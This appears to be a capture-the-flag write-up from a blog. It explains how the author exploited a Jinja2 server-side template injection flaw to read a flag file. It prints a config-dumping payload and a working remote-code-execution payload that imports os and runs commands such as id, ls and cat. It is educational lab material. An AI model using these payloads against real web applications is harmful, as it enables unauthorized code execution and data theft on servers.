<p>Template Injection occurs when an attacker is able to inject arbitrary code into a Jinja2 template. If the input from a user is directly rendered by Jinja2 without proper input sanitization, then it becomes possible for attackers to execute arbitrary code on the server.</p>

<p>For the purpose of this challenge, the template injection allows us to insert Python expressions directly into the template. These expressions can perform operations like accessing global variables, invoking built-in functions, or executing system commands â€” leading to potential Remote Code Execution (RCE).</p>

<h2 id="investigating-the-vulnerability">Investigating the Vulnerability</h2>

<p>Now that we have confirmed that the website is vulnerable to template injection, its time to gather more information about the enviroment we have been given. I did this by testing with the following payload: <code>{{config.items()}</code>, this gave the following output:</p>

<p><img src="image%20%281%29.png" alt="config.items output." /></p>

<p>In a typical web application (especially those built with frameworks like this), the config object holds important configuration settings for the application, such as database settings, debug mode, secret keys, and other environment-specific data. These settings are often stored in the form of key-value pairs.</p>

<p><code>config.items()</code> is a Python method that returns all the key-value pairs in the configuration as a list of tuples. In the context of this challenge, the output of <code>config.items()</code> helped us confirm that the application was  running in a Python environment, it also gave valuable information into what modules and settings were available.</p>

<h2 id="finding-and-executing-a-valid-remote-code-execution-payload">Finding and Executing a Valid Remote Code Execution Payload</h2>

<p>Now that I knew the application was vulnerable to template injection, I needed a payload that would provide Remote Code Execution (RCE). I searched for known Jinja2 RCE payloads and found the following Python one-liner:</p>

<pre><code class="language-python">{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
</code></pre>

<p>This payload works by accessing the Python os module via the <strong>globals</strong> dictionary, executing the id command, and returning the result.</p>

<p>By submitting the above payload, I got the following output, which was very suspicious:</p>

<p><img src="image%20%282%29.png" alt="Example of what id gave." /></p>

<p>The output from the <code>id</code> command showed that the attack was successful, and I had executed a system command on the server. This confirmed that I had Remote Code Execution.</p>

<p>To gather a bit more information about the system we had to work with, I replaced the <code>id</code> command with <code>ls</code>. To see where we were and what files were stored in the enviroment:</p>

<p><img src="image%20%283%29.png" alt="Example of ls." /></p>

<p>As we can see here, there exists the file <code>flag.txt</code>, so now we replace <code>ls</code> with <code>cat flag.txt</code> and we get the following returned:</p>

<p><img src="image%20%284%29.png" alt="The flag." /></p>

<p>And with that, we have successfully exploited the provded challenge using a <strong>Jinja2 Template Injection Vulnerability</strong> by obtaining <strong>Remote Code Execution</strong>.</p>
]]></content></item></channel></rss>